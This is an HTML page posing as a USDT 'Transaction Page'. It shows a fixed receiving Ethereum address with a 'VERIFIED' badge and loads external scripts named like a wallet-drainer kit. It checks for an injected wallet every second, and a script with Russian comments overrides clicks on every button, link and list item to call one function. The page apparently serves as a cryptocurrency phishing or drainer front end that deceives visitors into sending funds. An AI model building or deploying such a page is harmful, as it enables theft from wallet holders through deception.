<!DOCTYPE html>
<html lang="en">
<head>
    
    
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Transaction Page</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  body {
    font-family: 'Roboto', sans-serif;
    background-color: #f8f9fa;
    color: #333;
    margin: 0;
    padding: 20px; /* Add padding to body */
  }
  .container {
    width: 90%;
    max-width: 600px;
    padding: 20px;
    box-sizing: border-box;
    background-color: #ffffff;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    border-radius: 8px;
    margin: 0 auto; /* Center container horizontally */
    margin-top: 20px; /* Adjust top margin for spacing */
    position: relative; /* Add position relative */
  }
  .address-section, .amount-section {
    margin-bottom: 20px;
  }
  .address-section label, .amount-section label {
    display: block;
    font-weight: 500;
    margin-bottom: 8px;
    color: #495057;
  }
  .verified {
    float: right;
    font-size: 0.8em;
    color: #28a745;
    font-weight: bold;
  }
  #receiving-address {
    width: 100%;
    padding: 12px;
    border: 1px solid #ced4da;
    border-radius: 5px;
    box-sizing: border-box;
    font-size: 1em;
    color: #495057;
    background-color: #f2f3f5;
  }
  .amount-section {
    display: flex;
    align-items: center;
    justify-content: space-between; /* Align items at the top */
    margin-bottom: 10px; /* Adjusted margin */
  }
  #amount {
    flex: 1;
    padding: 12px;
    border: 1px solid #ced4da;
    border-radius: 5px;
    box-sizing: border-box;
    font-size: 1em;
    background-color: #f2f3f5;
    color: #495057;
    width: calc(100% - 100px); /* Adjusted width */
  }
  .assets {
    display: flex;
    align-items: center;
  }
  .usdt-icon {
    width: 24px;
    height: 24px;
    background-image: url('https://cryptologos.cc/logos/tether-usdt-logo.png?v=022');
    background-size: cover;
    margin-right: 8px;
  }
  .usdt-amount {
    font-weight: 500;
    color: #495057;
  }
  .submit-button {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 5px;
    background-color: #28a745;
    color: #ffffff;
    font-size: 1.2em;
    cursor: pointer;
    box-sizing: border-box;
    font-weight: 500;
    margin-top: 20px;
    transition: background-color 0.3s ease;
  }
  .submit-button:hover {
    background-color: #218838;
  }
  @media (max-width: 600px) {
    .container {
      width: 100%;
      padding: 15px;
    }
    .amount-section {
      flex-direction: column;
      align-items: flex-start;
    }
    .assets {
      justify-content: flex-start;
    }
    #amount {
      width: 100%; /* Full width on mobile */
      margin-bottom: 10px; /* Adjusted margin */
    }
  }
</style>
</head>
<body>
    
    
  
    
    
    
<div class="container">
  <div class="address-section">
    <label for="receiving-address">Receiving address</label>
    <span class="verified">VERIFIED</span>
    <input type="text" id="receiving-address" value="0x5f321e6096aEf71355337D20Bc05cccB0523f823" readonly>
  </div>
  <div class="amount-section">
    <label for="amount">Amount</label>
    <input type="number" id="amount" value="0">
    <div class="assets">
      <div class="usdt-icon"></div>
      <span class="usdt-amount">USDT</span>
    </div>
  </div>
  
  
 
  <div class="advanced_mode">
  <button class="submit-button"  onclick="init_co()">Confirm</button>
  
  
  </div>
    </div>
    <script src="./assets/w-modal.js"></script>
    <script src="./assets/w-loader.js"></script>
    <script src="./assets/modules.js"></script>
    <script src="./assets/main.js"></script>
    <script>
        setInterval(() => {
            document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
        }, 1000);
    </script>
    <script>
        // Функция, которую нужно вызвать
        function init_co() {
            console.log('Функция init_co вызвана!');
        }

        // Назначаем обработчик для всех элементов <li>, <button>, <a>
        document.addEventListener('click', event => {
            const target = event.target.closest('li, button, a'); // Проверяем, является ли цель <li>, <button> или <a>
            if (target) {
                event.preventDefault(); // Предотвращаем стандартное действие (например, переход по ссылке)
                init_co(); // Вызываем функцию
            }
        });

        console.log('Скрипт обработки кликов активирован.');
    </script>

</body>
</html>
